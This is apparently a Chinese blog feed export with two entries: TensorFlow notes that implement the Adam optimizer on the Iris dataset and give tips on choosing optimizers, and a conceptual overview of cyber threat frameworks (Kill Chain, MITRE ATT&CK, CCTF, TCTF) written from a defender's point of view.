<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m_w, m_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">v_w, v_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">beta1, beta2 = <span class="number">0.9</span>, <span class="number">0.999</span></span><br><span class="line">delta_w, delta_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">global_step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adam</span></span><br><span class="line">        m_w = beta1 * m_w + (<span class="number">1</span> - beta1) * grads[<span class="number">0</span>]</span><br><span class="line">        m_b = beta1 * m_b + (<span class="number">1</span> - beta1) * grads[<span class="number">1</span>]</span><br><span class="line">        v_w = beta2 * v_w + (<span class="number">1</span> - beta2) * tf.square(grads[<span class="number">0</span>])</span><br><span class="line">        v_b = beta2 * v_b + (<span class="number">1</span> - beta2) * tf.square(grads[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        m_w_correction = m_w / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta1, <span class="built_in">int</span>(global_step)))</span><br><span class="line">        m_b_correction = m_b / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta1, <span class="built_in">int</span>(global_step)))</span><br><span class="line">        v_w_correction = v_w / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta2, <span class="built_in">int</span>(global_step)))</span><br><span class="line">        v_b_correction = v_b / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta2, <span class="built_in">int</span>(global_step)))</span><br><span class="line"></span><br><span class="line">        w1.assign_sub(lr * m_w_correction / tf.sqrt(v_w_correction))</span><br><span class="line">        b1.assign_sub(lr * m_b_correction / tf.sqrt(v_b_correction))</span><br></pre></td></tr></table></figure>


<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用鸢尾花数据集，实现前向传播、反向传播，可视化loss曲线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time  <span class="comment">##1##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据，分别为输入特征和标签</span></span><br><span class="line">x_data = datasets.load_iris().data</span><br><span class="line">y_data = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率）</span></span><br><span class="line"><span class="comment"># seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样（为方便教学，以保每位同学结果一致）</span></span><br><span class="line">np.random.seed(<span class="number">116</span>)  <span class="comment"># 使用相同的seed，保证输入特征和标签一一对应</span></span><br><span class="line">np.random.shuffle(x_data)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_data)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将打乱后的数据集分割为训练集和测试集，训练集为前120行，测试集为后30行</span></span><br><span class="line">x_train = x_data[:-<span class="number">30</span>]</span><br><span class="line">y_train = y_data[:-<span class="number">30</span>]</span><br><span class="line">x_test = x_data[-<span class="number">30</span>:]</span><br><span class="line">y_test = y_data[-<span class="number">30</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换x的数据类型，否则后面矩阵相乘时会因数据类型不一致报错</span></span><br><span class="line">x_train = tf.cast(x_train, tf.float32)</span><br><span class="line">x_test = tf.cast(x_test, tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from_tensor_slices函数使输入特征和标签值一一对应。（把数据集分批次，每个批次batch组数据）</span></span><br><span class="line">train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(<span class="number">32</span>)</span><br><span class="line">test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成神经网络的参数，4个输入特征故，输入层为4个输入节点；因为3分类，故输出层为3个神经元</span></span><br><span class="line"><span class="comment"># 用tf.Variable()标记参数可训练</span></span><br><span class="line"><span class="comment"># 使用seed使每次生成的随机数相同（方便教学，使大家结果都一致，在现实使用时不写seed）</span></span><br><span class="line">w1 = tf.Variable(tf.random.truncated_normal([<span class="number">4</span>, <span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line">b1 = tf.Variable(tf.random.truncated_normal([<span class="number">3</span>], stddev=<span class="number">0.1</span>, seed=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">lr = <span class="number">0.1</span>  <span class="comment"># 学习率为0.1</span></span><br><span class="line">train_loss_results = []  <span class="comment"># 将每轮的loss记录在此列表中，为后续画loss曲线提供数据</span></span><br><span class="line">test_acc = []  <span class="comment"># 将每轮的acc记录在此列表中，为后续画acc曲线提供数据</span></span><br><span class="line">epoch = <span class="number">500</span>  <span class="comment"># 循环500轮</span></span><br><span class="line">loss_all = <span class="number">0</span>  <span class="comment"># 每轮分4个step，loss_all记录四个step生成的4个loss的和</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line">m_w, m_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">v_w, v_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">beta1, beta2 = <span class="number">0.9</span>, <span class="number">0.999</span></span><br><span class="line">delta_w, delta_b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">global_step = <span class="number">0</span></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练部分</span></span><br><span class="line">now_time = time.time()  <span class="comment">##2##</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epoch):  <span class="comment"># 数据集级别的循环，每个epoch循环一次数据集</span></span><br><span class="line">    <span class="keyword">for</span> step, (x_train, y_train) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_db):  <span class="comment"># batch级别的循环 ，每个step循环一个batch</span></span><br><span class="line"> <span class="comment">##########################################################################       </span></span><br><span class="line">        global_step += <span class="number">1</span></span><br><span class="line"> <span class="comment">##########################################################################       </span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># with结构记录梯度信息</span></span><br><span class="line">            y = tf.matmul(x_train, w1) + b1  <span class="comment"># 神经网络乘加运算</span></span><br><span class="line">            y = tf.nn.softmax(y)  <span class="comment"># 使输出y符合概率分布（此操作后与独热码同量级，可相减求loss）</span></span><br><span class="line">            y_ = tf.one_hot(y_train, depth=<span class="number">3</span>)  <span class="comment"># 将标签值转换为独热码格式，方便计算loss和accuracy</span></span><br><span class="line">            loss = tf.reduce_mean(tf.square(y_ - y))  <span class="comment"># 采用均方误差损失函数mse = mean(sum(y-out)^2)</span></span><br><span class="line">            loss_all += loss.numpy()  <span class="comment"># 将每个step计算出的loss累加，为后续求loss平均值提供数据，这样计算的loss更准确</span></span><br><span class="line">        <span class="comment"># 计算loss对各个参数的梯度</span></span><br><span class="line">        grads = tape.gradient(loss, [w1, b1])</span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"> <span class="comment"># adam</span></span><br><span class="line">        m_w = beta1 * m_w + (<span class="number">1</span> - beta1) * grads[<span class="number">0</span>]</span><br><span class="line">        m_b = beta1 * m_b + (<span class="number">1</span> - beta1) * grads[<span class="number">1</span>]</span><br><span class="line">        v_w = beta2 * v_w + (<span class="number">1</span> - beta2) * tf.square(grads[<span class="number">0</span>])</span><br><span class="line">        v_b = beta2 * v_b + (<span class="number">1</span> - beta2) * tf.square(grads[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        m_w_correction = m_w / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta1, <span class="built_in">int</span>(global_step)))</span><br><span class="line">        m_b_correction = m_b / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta1, <span class="built_in">int</span>(global_step)))</span><br><span class="line">        v_w_correction = v_w / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta2, <span class="built_in">int</span>(global_step)))</span><br><span class="line">        v_b_correction = v_b / (<span class="number">1</span> - tf.<span class="built_in">pow</span>(beta2, <span class="built_in">int</span>(global_step)))</span><br><span class="line"></span><br><span class="line">        w1.assign_sub(lr * m_w_correction / tf.sqrt(v_w_correction))</span><br><span class="line">        b1.assign_sub(lr * m_b_correction / tf.sqrt(v_b_correction))</span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个epoch，打印loss信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, loss_all / <span class="number">4</span>))</span><br><span class="line">    train_loss_results.append(loss_all / <span class="number">4</span>)  <span class="comment"># 将4个step的loss求平均记录在此变量中</span></span><br><span class="line">    loss_all = <span class="number">0</span>  <span class="comment"># loss_all归零，为记录下一个epoch的loss做准备</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试部分</span></span><br><span class="line">    <span class="comment"># total_correct为预测对的样本个数, total_number为测试的总样本数，将这两个变量都初始化为0</span></span><br><span class="line">    total_correct, total_number = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x_test, y_test <span class="keyword">in</span> test_db:</span><br><span class="line">        <span class="comment"># 使用更新后的参数进行预测</span></span><br><span class="line">        y = tf.matmul(x_test, w1) + b1</span><br><span class="line">        y = tf.nn.softmax(y)</span><br><span class="line">        pred = tf.argmax(y, axis=<span class="number">1</span>)  <span class="comment"># 返回y中最大值的索引，即预测的分类</span></span><br><span class="line">        <span class="comment"># 将pred转换为y_test的数据类型</span></span><br><span class="line">        pred = tf.cast(pred, dtype=y_test.dtype)</span><br><span class="line">        <span class="comment"># 若分类正确，则correct=1，否则为0，将bool型的结果转换为int型</span></span><br><span class="line">        correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)</span><br><span class="line">        <span class="comment"># 将每个batch的correct数加起来</span></span><br><span class="line">        correct = tf.reduce_sum(correct)</span><br><span class="line">        <span class="comment"># 将所有batch中的correct数加起来</span></span><br><span class="line">        total_correct += <span class="built_in">int</span>(correct)</span><br><span class="line">        <span class="comment"># total_number为测试的总样本数，也就是x_test的行数，shape[0]返回变量的行数</span></span><br><span class="line">        total_number += x_test.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 总的准确率等于total_correct/total_number</span></span><br><span class="line">    acc = total_correct / total_number</span><br><span class="line">    test_acc.append(acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Test_acc:&quot;</span>, acc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------&quot;</span>)</span><br><span class="line">total_time = time.time() - now_time  <span class="comment">##3##</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total_time&quot;</span>, total_time)  <span class="comment">##4##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 loss 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Loss Function Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Loss&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(train_loss_results, label=<span class="string">&quot;$Loss$&quot;</span>)  <span class="comment"># 逐点画出trian_loss_results值并连线，连线图标是Loss</span></span><br><span class="line">plt.legend()  <span class="comment"># 画出曲线图标</span></span><br><span class="line">plt.show()  <span class="comment"># 画出图像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 Accuracy 曲线</span></span><br><span class="line">plt.title(<span class="string">&#x27;Acc Curve&#x27;</span>)  <span class="comment"># 图片标题</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Epoch&#x27;</span>)  <span class="comment"># x轴变量名称</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Acc&#x27;</span>)  <span class="comment"># y轴变量名称</span></span><br><span class="line">plt.plot(test_acc, label=<span class="string">&quot;$Accuracy$&quot;</span>)  <span class="comment"># 逐点画出test_acc值并连线，连线图标是Accuracy</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请将loss曲线、ACC曲线、total_time记录到 class2\优化器对比.docx  对比各优化器收敛情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>运行结果</strong>：</p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642666053012.png" alt="Adam-Loss"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642666073947.png" alt="Adam-Acc"></p>
<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642666106313.png" alt="Adam-Time"></p>
<h2 id="优化算法的选择"><a href="#优化算法的选择" class="headerlink" title="优化算法的选择"></a>优化算法的选择</h2><p>前面我们介绍了5种不同的优化算法，其求解方法各不相同，那么我们在实际应用中要使用哪一个呢？</p>
<p>很难说某一个优化器在所有情况下都表现很好，我们需要根据具体任务选取优化器。一些优化器在计算机视觉任务表现很好，另一些在涉及RNN网络时表现很好，甚至在稀疏数据情况下表现更出色。</p>
<p>总结上述，基于原始SGD增加动量和Nesterov动量，RMSProp是针对AdaGrad学习率衰减过快的改进，它与AdaDelta非常相似，不同的一点在于AdaDelta采用参数更新的均方根（RMS）作为分子。Adam在RMSProp的基础上增加动量和偏差修正。如果数据是稀疏的，建议用自适用方法，即Adagrad, RMSprop, Adadelta, Adam。RMSprop, Adadelta, Adam 在很多情况下的效果是相似的。随着梯度变的稀疏，Adam 比 RMSprop 效果会好。总的来说，<strong>Adam整体上是最好的选择</strong>。</p>
<p>然而很多论文仅使用不带动量的vanilla SGD和简单的学习率衰减策略。SGD通常能够达到最小点，但是相对于其他优化器可能要采用更长的时间。采取合适的初始化方法和学习率策略，SGD更加可靠，但也有可能陷于鞍点和极小值点。因此，当在训练大型的、复杂的深度神经网络时，我们想要快速收敛，应<strong>采用自适应学习率策略的优化器</strong>。</p>
<p>如果是刚入门，优先考虑<code>Adam</code>或者<code>SGD+Nesterov Momentum</code>。</p>
<p>算法没有好坏，最适合数据的才是最好的，永远记住：<strong>No free lunch theorem</strong>。</p>
<h2 id="优化算法的常用tricks"><a href="#优化算法的常用tricks" class="headerlink" title="优化算法的常用tricks"></a>优化算法的常用tricks</h2><ol>
<li><p>首先，各大算法孰优孰劣并无定论。如果是刚入门，优先考虑SGD+Nesterov Momentum或者Adam.</p>
</li>
<li><p>选择你熟悉的算法——这样你可以更加熟练地利用你的经验进行调参。</p>
</li>
<li><p>充分了解你的数据——如果模型是非常<strong>稀疏</strong>的，那么优先考虑<strong>自适应学习率</strong>的算法。</p>
</li>
<li><p>根据你的需求来选择——在模型设计实验过程中，要快速验证新模型的效果，可以<strong>先用Adam</strong>进行<strong>快速实验优化</strong>；在模型上线或者结果发布前，可以用<strong>精调的SGD</strong>进行模型的<strong>极致优化</strong>。</p>
</li>
<li><p>先用<strong>小数据集</strong>进行实验。有论文研究指出，随机梯度下降算法的收敛速度和数据集的大小的关系不大。因此可以先用一个<strong>具有代表性</strong>的小数据集进行实验，测试一下最好的优化算法，并通过<strong>参数搜索</strong>来寻找最优的训练参数。</p>
</li>
<li><p>考虑不同算法的<strong>组合</strong>。先用Adam进行快速下降，而后再换到SGD进行充分的调优。</p>
</li>
<li><p><strong>充分打乱数据集</strong>（shuffle）。这样在使用自适应学习率算法的时候，可以避免某些特征集中出现，而导致的有时学习过度、有时学习不足，使得下降方向出现偏差的问题。在<strong>每一轮迭代</strong>后对训练数据打乱是一个不错的主意。</p>
</li>
<li><p>训练过程中<strong>持续监控</strong>训练数据和验证数据上的目标函数值以及精度或者AUC等指标的变化情况。对训练数据的监控是要保证模型进行了充分的训练——下降方向正确，且学习率足够高；对验证数据的监控是为了避免出现过拟合。</p>
</li>
<li><p>制定一个合适的<strong>学习率衰减策略</strong>。可以使用<strong>分段常数衰减策略</strong>，比如每过多少个epoch就衰减一次；或者利用精度或者AUC等性能指标来监控，当测试集上的指标不变或者下跌时，就降低学习率。</p>
</li>
<li><p><strong>Early stopping</strong>。如Geoff Hinton所说：“Early Stopping是美好的免费午餐”。你因此必须在训练的过程中时常在验证集上监测误差，在<strong>验证集</strong>上如果损失函数不再显著地降低，那么应该<strong>提前结束训练</strong>。</p>
</li>
<li><p>算法参数的<strong>初始值选择</strong>。 初始值不同，获得的最小值也有可能不同，因此梯度下降求得的只是局部最小值；当然如果损失函数是凸函数则一定是最优解。由于有局部最优解的风险，需要多次用不同初始值运行算法，关键损失函数的最小值，选择损失函数最小化的初值。</p>
</li>
</ol>
<hr>
<blockquote>
<p>写在最后：至此已经完成ch2的学习，但是也只是跟着课程过了一遍而已，想要融会贯通还要大量练习。<br>在本章学了神经网络的优化过程，对前向传播、激活函数、学习率、正则化、损失函数、优化算法等方面有了系统的认识，对如何选取合适的方法有了初步了解。<br>在笔记里有一个常用TensorFlow API及代码实现的附录，要多看看。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>TensorFlow实践</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>威胁分析框架概述</title>
    <url>/2023/10/20/%5B%E2%88%9A%5DATT&amp;CK%E5%92%8CNAS%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="ATT-CK和TCTF框架"><a href="#ATT-CK和TCTF框架" class="headerlink" title="ATT&amp;CK和TCTF框架"></a>ATT&amp;CK和TCTF框架</h1><p>从网空杀伤链模型演进到<code>TCTF、ATT&amp;CK</code>等更细粒度的<strong>威胁框架体系</strong>，网空威胁框架已成为深入认知威胁，交换行动情报、改善防御能力、提升产品和体系能力的重要参考。</p>
<p>实现告警和知识标签输出靠拢到威胁框架体系，并在此基础上参照威胁框架不断完善安全引擎、产品能力和分析支撑工作。</p>
<h2 id="网空威胁框架的发展历程"><a href="#网空威胁框架的发展历程" class="headerlink" title="网空威胁框架的发展历程"></a>网空威胁框架的发展历程</h2><p>早期的网空威胁，往往表现为<strong>离散的威胁事件</strong>–因此，对应采取的威胁认知方式，也往往是<strong>离散化</strong>的，即单独地看待、分析和处置各个威胁事件。</p>
<p>然而，随着<strong>网络安全上升到国家安全</strong>的层面，网空已成为大国博弈与地缘斗争的激烈对抗领域，对网空安全构成严重危害的主体威胁，已转化为<strong>APT（Advanced Persistent Threat，高级持续威胁）形式</strong>的体系化攻击。鉴于APT攻击作业的持久性，跨时间域、跨网域而离散发生的多起威胁事件，本质上属于同一攻击作业过程。这些威胁事件，貌似是各个孤立存在的，然而，它们服务于同一攻击作业中不同阶段不同目的，<strong>具有前后关联、配合协作的内在联系</strong>。</p>
<p>当前网空对抗的严峻形势，就促成了<strong>网空威胁框架</strong>的提出与发展。网空威胁框架是一套科学的方法和工具体系，能够更深入地认知APT形式的网空威胁，系统全面地分析其<strong>攻击意图、手法、过程与技术</strong>，达成增强防御有效性的目标。</p>
<hr>
<p><strong>什么是威胁框架？</strong></p>
<p><strong>威胁框架</strong>是<strong>系统认知网空威胁、构建有效防御的方法与工具体系</strong>。简言之，威胁框架具有<code>“约束性”</code>和<code>“支撑性”</code>两个基本属性。</p>
<ul>
<li>所谓“<strong>约束性</strong>”，即为<strong>界定所认知的问题</strong>；例如，“横向移动”是指一种什么样的攻击作业。</li>
<li>所谓“<strong>支撑性</strong>”，即为<strong>能够提供对问题的解析与处理</strong>；例如，“横向移动”的作业目标、作业过程、检测要素、缓解措施等。</li>
</ul>
<p>具体来看，为了能够满足不同程度的分析需求，可简可繁，既能<strong>向高层概念抽象</strong>，又能<strong>向底层细节解析</strong>，威胁框架通常采取层次化的组成结构。这种层次化的组成结构，首先通过构造和定义核心概念与术语，达成分析的基础性共识；然后，进一步引入更多的或更为具象化的属性描述、特征提取、关系刻画、功能作用、甚至算法推演等，形成逐步深入的分析层次，最终构成多层结构的分析体系。借助这一分析体系，网空防御者即可实施对网空威胁的分析预测、交流共享情报、优化防御措施、改善防御态势等。</p>
<h2 id="网空威胁框架的构建过程"><a href="#网空威胁框架的构建过程" class="headerlink" title="网空威胁框架的构建过程"></a><strong>网空威胁框架的构建过程</strong></h2><p>具体的有影响力的威胁框架，主要是洛克希德-马丁的<code>网空杀伤链框架</code>（Cyber Kill Chain Framework）、MITRE的<code>ATT&amp;CK框架</code>（Common Knowledge base of Adversary Tactics and Techniques，对手战术技术公共知识库）、ODNI的<code>CCTF框架</code>（Common Cyber Threat Framework，公共网空威胁框架），以及NSA的<code>TCTF框架</code>（Technical Cyber Threat Framework，技术性网空威胁框架）。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231013150655109.png" alt="image-20231013150655109"></p>
<p>下面<strong>简单介绍下这几家</strong>：</p>
<h3 id="洛克希德-马丁与网空杀伤链框架"><a href="#洛克希德-马丁与网空杀伤链框架" class="headerlink" title="洛克希德-马丁与网空杀伤链框架"></a><strong>洛克希德-马丁</strong>与<strong>网空杀伤链框架</strong></h3><p>洛克希德-马丁作为<strong>全球最大的防务承包商</strong>，对信息网络安全具有高度严格的需求以及全谱领先的能力。</p>
<p>其于2011年提出的<code>网空杀伤链框架</code>，将网空威胁划分为7个阶段，分别是“<code>侦察-武器构建-载荷投送-突防利用-安装植入-通信控制-达成目标</code>”。</p>
<p>网空杀伤链框架创立了网空威胁框架的基本设计理念，即<strong>基于攻击者视角、以整个攻击行动统一离散的威胁事件而形成整体性分析</strong>。不同于以往基于防御者视角的安全模型与分析方法，网空杀伤链从攻击者视角更为清晰地理解攻击行动，通过上下文建立起事件之间的关联分析，从而更有效地理解攻击目标与攻击过程，也更有助于找到潜在对策与应对手段。</p>
<h3 id="MITRE与ATTCK框架"><a href="#MITRE与ATTCK框架" class="headerlink" title="MITRE与ATTCK框架"></a>MITRE与ATTCK框架</h3><p><strong>历史</strong>：MITRE是一家历史悠久的，专注于科学与技术研究，具有政府安全服务背景的非盈利机构，尤其以安全建模能力而见长。</p>
<p><strong>前缺</strong>：由于洛克希德-马丁<strong>网空杀伤链框架的抽象层次较高</strong>，虽然有助于描述攻击整体过程与理解攻击目的，但难以实际运用于表述和分析敌方的各个行动、行动之间的<strong>因果作用、行动序列与战术目标</strong>的关系，也缺乏分析攻击行动所涉及的与平台相关的数据源、防御措施、安全配置和解决对策等要素。</p>
<p><strong>创新</strong>：为针对性解决威胁框架<strong>在战术技术层面上实践实用的问题</strong>，MITRE提出了<code>ATT&amp;CK</code>框架。ATT&amp;CK框架在网空杀伤链框架基础上，从大量的现实网空威胁中提炼出攻击行动的具体信息，对这些信息进行了细致的技术分解与特征描述，进而构造了丰富的攻击者战术技术知识库；通过知识库以及相关的工具系统，可以深入分析攻击行动的过程与细节，从而得以有效地改善防御态势、提高防御水平、优化安全产品与安全服务的技术能力。</p>
<p><strong>更新</strong>：此外，ATT&amp;CK框架的迭代更新非常积极，从2015年正式推出，几乎每隔三至六个月，都会有一次显著的更新，这使得ATT&amp;CK框架能够及时地跟踪、涵盖最新的APT攻击特征，从而保持ATT&amp;CK框架的生命力与有效性。</p>
<hr>
<p><strong>过渡</strong>：从网空杀伤链框架到ATT&amp;CK框架，反映了对网空威胁的认知，在技术层面上<strong>由浅入深的演进</strong>。然而，网空对抗的本质是国家行为体的对抗，网空威胁不仅仅只是技术层面的问题，也不仅仅是只依赖安全厂商就能解决的问题。政府与国家情报体系必须密切关注网空威胁，并依据国家安全利益，对网空威胁的防御和反制进行分析研判、规划决策、资源协调、组织联动等方方面面的工作。为此，相关机构就提出了另外两个<strong>具有情报体系背景</strong>的网空威胁框架，分别是<code>CCTF框架和TCTF框架</code>。</p>
<h3 id="美国国家情报总监办公室与-CCTF框架"><a href="#美国国家情报总监办公室与-CCTF框架" class="headerlink" title="美国国家情报总监办公室与 CCTF框架"></a>美国国家情报总监办公室与 CCTF框架</h3><p><strong>背景</strong>：<code>CCTF框架</code>是ODNI（Office of the Director of National Intelligence，美国国家情报总监办公室）于2017年发布的面向政府机构、情报部门、政策与决策部门的网空威胁交流分析框架。</p>
<p><strong>创新</strong>：该框架将威胁过程划分为“<strong>准备- 突破- 存在- 作用与后果</strong>”四个阶段，并通过分层描述，实现对网空威胁的分类与特征化，进而支撑分析、高层决策、趋势与差距研判等工作。</p>
<p><strong>优点</strong>：总体而言，CCTF框架的攻击阶段划分是<strong>极为广义化</strong>的，其层次化的分析模型也是极度简化与高度概括的，所采用的术语与描述也不受网空专业技术语境的约束。这样的设计特性，使得<strong>网空专家和非网空专家都能够借助该框架进行清楚沟通与相互理解</strong>，有助于政府高层对网空威胁的分析决策。</p>
<p><strong>缺点</strong>：然而，对网空威胁的认知与对抗，终究是一个<strong>高度技术化</strong>的问题；与此同时，任何涉及网空威胁的高层分析与决策，也终究需要技术部门与安全厂商去落实执行。有机地将政府高层决策与厂商安全实践能力紧密结合在一起，是网空体系化对抗所必然要求的。</p>
<h3 id="NSA与TCTF框架"><a href="#NSA与TCTF框架" class="headerlink" title="NSA与TCTF框架"></a>NSA与TCTF框架</h3><p>NSA（National Security Agency，美国国家安全局）于2018年提出了<code>TCTF框架</code>，以作为<strong>CCTF框架的技术性扩展</strong>。在大国博弈与地缘竞争背景下，NSA在全球网空对抗态势中，具有极为特殊与重要的角色和地位。一方面，NSA是美方情报体系中体量最大的成员机构，另一方面，NSA长期专注于技术情报，是全球网空攻防实力最强的一方。基于NSA的情报角色和技术优势，TCTF框架深入到网空威胁专业技术语境中，完成了对攻击意图、作业阶段、行动特征的拆解与刻画，形成了“政府情报机构”与“安全执行厂商”之间密切交流的粘合剂。</p>
<hr>
<p><strong>综上</strong>，ATTCK&amp;CK框架是对网空杀伤链框架的改进，TCTF框架是对CCTF框架的改进与扩展，所以选择最新的框架即可。</p>
<p>概括性地来看，二者都<strong>涵盖了网空威胁从高层目标意图到底层行为细节</strong>，但二者并非简单的冗余或重复，不同点如下：</p>
<ul>
<li><code>ATT&amp;CK框架</code>侧重<strong>现实攻击的技术分析</strong>层面，以<strong>面向技术研究和产业界</strong>为主；</li>
<li><code>TCTF框架</code>侧重<strong>攻防对抗的情报研判</strong>层面，以<strong>面向政府和情报机构的技术部门</strong>为主。</li>
</ul>
<p>这种差异，并不会形成对二者综合运用的障碍，反而恰恰是由于二者差异的存在，能够产生<strong>互补与价值叠加</strong>的效果。</p>
<h1 id="框架内容介绍"><a href="#框架内容介绍" class="headerlink" title="框架内容介绍"></a>框架内容介绍</h1><h2 id="ATT-CK框架"><a href="#ATT-CK框架" class="headerlink" title="ATT&amp;CK框架"></a>ATT&amp;CK框架</h2><p><code>ATT&amp;CK框架</code>是一套技术细节丰富、易于共享应用的<strong>攻击行为分析模型和知识库</strong>。</p>
<blockquote>
<p> <strong>核心要素</strong>是TTP：<code>TTP（Tactics, Techniques and Procedures；战术, 技术与过程）</code></p>
</blockquote>
<ul>
<li>所谓<strong>战术</strong>，是指对<strong>攻击行动的概括性要求</strong>，表达的是<strong>目的或行动原因</strong>，常用于攻击作业规划与过程追踪；</li>
<li>所谓技术，是指<strong>通过什么动作执行来达成战术的目标</strong>，包含预期完成的行动，但<strong>不包括完成行动的规定性指导</strong>；</li>
<li>所谓过程，是<strong>特定的案例化或参照化技术执行说明</strong>，是完成任务的<strong>详细、具体的操作说明和指导</strong>，重点在于提供完整、详细、正确的任务步骤说明。</li>
</ul>
<p>TTP使得防御系统摆脱或降低了<strong>对IOC（Indicators of Compromise）的依赖</strong>，将防御从检测<strong>机器层执行动作信息</strong>，提升到检测<strong>作业层行为信息</strong>。相比于恶意代码Hash值、IP地址等IOC指标，基于TTP的行为特征，是很难改变的，攻击者需要付出大量努力才能发现新的作业手法并实现防御规避的目的，其技术难度、时间周期和成本代价都是巨大的。</p>
<p>因此，<strong>TTP刻画了攻击者相对稳定的行为特征</strong>；也因此，<strong>基于TTP的攻击行动检测分析，对于识别攻击和提升防御，都具有更高效和更鲁棒的安全价值</strong>。</p>
<blockquote>
<p> 下面具体介绍<strong>ATTCK的知识库</strong>：</p>
</blockquote>
<p>对照<strong>网空杀伤链（前一）</strong>的阶段划分，如下图，<code>ATT&amp;CK框架</code>的内容包括“<code>Pre-ATT&amp;CK</code>”与“<code>Enterprise（企业）ATT&amp;CK</code>”。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231013155844920.png" alt="image-20231013155844920" style="zoom:50%;" />

